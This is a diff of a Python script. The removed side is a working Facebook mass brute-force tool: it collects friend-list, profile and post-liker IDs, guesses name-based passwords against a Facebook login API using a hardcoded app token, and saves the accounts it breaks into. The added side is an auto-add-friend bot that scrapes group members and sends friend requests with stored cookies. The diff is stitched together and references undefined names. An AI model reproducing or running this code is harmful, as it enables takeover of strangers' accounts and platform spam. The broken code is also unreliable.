@@ -1,34 +1,21 @@
-import os,sys,time,requests,json,random
-from time import sleep
-from concurrent.futures import ThreadPoolExecutor
-from colorama import init, Fore, Back
-B = Fore.BLUE
-W = Fore.WHITE
-C = Fore.CYAN
-R = Fore.RED
-G = Fore.GREEN
-Y = Fore.YELLOW
-M = Fore.MAGENTA
-BL = Fore.BLACK
-ERR = f"   {R}[!]{W} "
-QUE = f"   {M}[?]{W} "
-INF = f"   {M}[+]{W} "
-DAN = f"{R} [!]"
-id=[]
-die=0
-cp=[]
-ok=[]
-def back():
-    input(W+"["+warna+" Press Enter To Back "+W+"]")
-    os.system('python abc.py')
-def baner():
-    os.system("cls" if os.name == "nt" else "clear")
-    print(f"""   
-   {M}╔═╗{W}┬┌┬┐┌─┐┬  ┌─┐  {M}╔╦╗{W}╔╗ ╔═╗
-   {M}╚═╗{W}││││├─┘│  ├┤   {M}║║║{W}╠╩╗╠╣ 
-   {M}╚═╝{W}┴┴ ┴┴  ┴─┘└─┘  {M}╩ ╩{W}╚═╝╚  \033[00m""")
+# Karjok Pangesty
+# Add friend tool
+# start june 19th 2019 6:33am
+# finish june 19th 2019 11:12am
 
-    print("   "+Back.WHITE+BL+"      By : Fahmi Apz      \n\033[00m")
+
+
+
+
+from requests import *
+from bs4 import BeautifulSoup as bs
+from http.cookiejar import LWPCookieJar as cj
+from json import *
+import re,sys
+
+s = Session()
+s.cookies = cj('kuki')
+
 def masuk():
     try:
         tk=open("token").read()
@@ -42,153 +29,97 @@ def masuk():
     else:
         print(ERR+"Token Not Valid!")
         back()
-def info():
-    req=requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}").text
-    js=json.loads(req)
-    print(W+"   Login as : "+warna+js["name"])
-    print(W+"   ID       : "+warna+js["id"])
-    print()
-def home():
-    baner()
-    print(f"""
-   {warna}1). {W}Go To Menu
-   {warna}2). {W}Delete Token
-   {warna}0). {W}Exit\033[00m""")
-    f=input(W+"   >> "+warna)
-    if f == "01" or f == "1":
-       if not masuk():
-              print(ERR +' You Must Login!')
-              back()
-       else:
-              menu()
-    elif f == "02" or f == "2":
-       try:
-           os.remove('token')
-       except:
-            pass
-       print()
-       print(INF + "Done!")
-       back()
-    elif f == "00" or f == "0":
-       baner()
-       sys.exit(W+"   Thanks you for use this tool :)")
-def menu():
-    baner()
-    info()
-    print(f"""   
-   {warna}1). {W}Crack From Friendlist
-   {warna}2). {W}Crack From Friend    
-   {warna}3). {W}Crack From Post
-   {warna}0). {W}Back""")
-    f=input(W+"   >> "+warna)
-    if f == "00" or f == "0":
-       home()
-    if f == "01" or f == "1":
-       baner()
-       info()
-       req=requests.get(f"https://graph.facebook.com/me?fields=friends.limit(5000)&access_token={token}").text
-       js=json.loads(req)
-       for x in js['friends']['data']:
-           id.append(x['name'] + '|' + x['id'])
-       print(QUE+"Start Crack...")
-       for user in id:
-           ss=user.split("|")
-           us=ss[0].split(" ")
-           for x in us:
-               litpas=[
-                    str(x) + "123",
-                    str(x) + "1234",
-                    str(x) + "12345",
-                    str(x) + "123456"
-               ]
-               litpas.append('Sayang')
-               for passw in set(litpas):
-                   login(ss[1],passw)
-       print(INF+"Done!")
-       back()
-    elif f == "02" or f == "2":
-       baner()
-       info()
-       uid=input(QUE+"User/ID : "+warna)
-       req=requests.get(f"https://graph.facebook.com/{uid}?fields=friends.limit(5000)&access_token={token}").text
-       js=json.loads(req)
-       for x in js["friends"]["data"]:
-           id.append(x["name"] + "|" + x["id"])
-       print(QUE+"Start Crack...")
-       for user in id:
-           ss=user.split("|")
-           us=ss[0].split(" ")
-           for x in us:
-               litpas=[
-                    str(x) + "123",
-                    str(x) + "1234",
-                    str(x) + "12345",
-                    str(x) + "123456"
-               ]
-               litpas.append('Sayang')
-               for passw in set(litpas):
-                   login(ss[1],passw)
-       print(INF+"Done!")
-       back()
-    elif f == "03" or f == "3":
-       baner()
-       info()
-       cc=input(QUE+"PostID : "+warna)
-       req=requests.get(f"https://graph.facebook.com/{cc}?fields=likes.sumary(true)&access_token={token}").text
-       js=json.loads(req)
-       for x in js["likes"]["data"]:
-           id.append(x["name"] + "|" + x["id"])
-       print(QUE+"Start Crack...")
-       for user in id:
-           ss=user.split('|')
-           us=ss[0].split(' ')
-           for x in us:
-               litpas=[
-                    str(x) + "123",
-                    str(x) + "1234",
-                    str(x) + "12345",
-                    str(x) + "123456"
-               ]
-               litpas.append('Sayang')
-               for passw in set(litpas):
-                   login(ss[1],passw)
-       print(INF+"Done!")
-       back()
-def login(username,password,cek=False):
-          global die
-          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
-          params = {
-                   'access_token': b,
-                   'format': 'JSON',
-                   'sdk_version': '2',
-                   'email': username,
-                   'locale': 'en_US',
-                   'password': password,
-                   'sdk': 'ios',
-                   'generate_session_cookies': '1',
-                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
-          }
-          api = 'https://b-api.facebook.com/method/auth.login'
-          response = requests.get(api, params=params)
-          if "EAA" in response.text:
-             print(f"   {W}[{G}Ok{W}] \033[00m{username}{R}<->\033[00m{password}")
-             if cek:
-                ok.append(username + "|" + password)
-             else:
-                with open('life.txt','a') as ex:
-                     ex.write(username + "|" + password + "\n")
-          elif "www.facebook.com" in response.json()['error_msg']:
-               print(f"   {W}[{Y}Cp{W}] \033[00m{username}{R}<->\033[00m{password}")
-               if cek:
-                  cp.append(username + "|" + password)
-               else:
-                  with open("check.txt","a") as ex:
-                       ex.write(username + "|" + password + "\n")
-          else:
-               die+=1
-if __name__=="__main__":
-    rd=[Y,G,C,M]
-    warna=random.choice(rd)
-    baner()
-    token=masuk()
-    home()
+	else:
+		print(r.url)
+def getgrup(tokn):
+	print('Daftar grup anda')
+	no = 0
+	idg =[]
+	r = s.get('https://graph.facebook.com/me/groups?access_token='+tokn).json()
+	try:
+		for i in r['data']:
+			no +=1
+			print(f"{no}. \033[92m{i['name']}\033[0m ({i['privacy']})")
+			idg.append((i['id'],i['name']))
+	except:
+		print(r['error']['message'])
+		login()
+		exit()
+	op = input('\nPilih : ')
+	getgrupmem(idg[int(op)-1][0],idg[int(op)-1][1])
+
+def getgrupmem(idg,name):
+	n = int(input('Jumlah id (max:5000): '))
+	no = 0
+	id = []
+	url =[f'https://graph.facebook.com/{idg}/members?fields=id&limit=99999999&access_token='+tokn]
+	print(f'Mantap, kamu pilih {name}')
+	while True:
+		if len(id) == n:
+			break
+		try:
+			r = get(url[no]).json()
+			no +=1
+			for i in r['data']:
+				if len(id) == n:
+					break
+				id.append(i['id'])
+				print(f"\rMengambil {len(id)} id",end=""),;sys.stdout.flush()	
+			url.append(r['paging']['next'])
+		except:
+			break
+	print(f'\nAuto add friend ke {len(id)} id member {name}..')
+	from multiprocessing.pool import ThreadPool as tp
+	t = tp(10)
+	p = t.map(add,id)
+def add(id):
+	s.cookies.load()
+	r = s.get(f'https://mbasic.facebook.com/{id}').text
+	b = bs(r,'html.parser')
+	name = b.title.text
+	a = b.find('a',string='Tambah Jadi Teman')
+	if a == None:
+		if 'Batalkan permintaan pertemanan' in str(r):
+			print(f'[{id}]\033[92m {name} \033[0m Menunggu konfirmasi')
+
+		elif 'Batalkan pertemanan' in str(r):
+			print(f'[{id}]\033[93m {name} \033[0m Sudah berteman, lewati')
+
+		elif 'Halaman yang diminta tidak bisa ditampilkan sekarang' in str(r):
+			print(f'[{id}]\033[91m {name} \033[0m Profil nggak ada, gagal')
+		else:
+			print(f'[{id}]\033[91m {name} \033[0m Dia heker, gabisa di add')	
+	else:
+		r = s.get(f'https://mbasic.facebook.com{a.get("href")}').text
+		b = bs(r,'html.parser')
+		if 'Apakah Orang Ini Mengenal Anda?' in str(r) or 'Hanya kirimkan permintaan pertemanan kepada orang-orang yang Anda kenal secara pribadi' in str(r):
+			print(f'[{id}]\033[93m {name} \033[0mPerlu konfirmasi, lewati.')
+		elif 'Permintaan Pertemanan Terkirim' in str(r):
+			print(f'[{id}]\033[92m {name} \033[0m Permintaan terkirim')
+		elif 'Orang ini telah mencapai batas 5000 teman' in str(r):
+			print(f'[{id}]\033[93m {name} \033[0m Temannya sudah 5k, lewati.')
+		else:
+			print(f'[{id}]\033[91m {name} \033[0m Orang ini heker, gabisa di add')
+def banner():
+	print('''\033[92m                               
+   ██████    ██    ██              
+   ██  ██████████████              
+   ████████  ████  ██              
+   ██  ██████████████
+________________________
+\033[0m  Auto Add Friend Tool
+ karjok pangesty © 2019
+ \033[91mhttps://t.me/CRABS_ID\033[0m
+
+''')        
+
+if __name__=='__main__':
+	banner()
+	try:
+		open('token.txt','r')
+		open('kuki','r')
+	except:
+		login()	
+	tokn = open('token.txt','r').read()
+	getgrup(tokn)
+#	add('100014893153962')			
